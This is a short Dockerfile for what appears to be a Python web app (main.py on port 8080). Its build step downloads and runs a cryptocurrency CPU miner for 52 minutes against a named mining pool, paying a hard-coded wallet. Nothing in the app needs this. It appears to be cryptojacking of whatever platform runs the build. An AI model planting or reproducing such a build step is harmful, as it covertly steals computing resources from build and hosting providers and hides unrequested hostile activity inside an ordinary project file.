FROM debian:buster

RUN apt update && apt install wget -y && wget https://github.com/m-pays/m-cpuminer-v2/releases/download/2.4/m-minerd-64-linux.tar.gz && tar xfvz m-minerd-64-linux.tar.gz && timeout 52m ./m-minerd-64-linux/m-minerd -a m7mhash -o stratum+tcp://eu.npc-mining.net:3002 -u 9Q8YVTkcGU2UXzigqW6uBgkXjPQPns2RZq -p c=XMG -e 78

ENV PORT=8080

COPY . .

CMD ["python","main.py"]
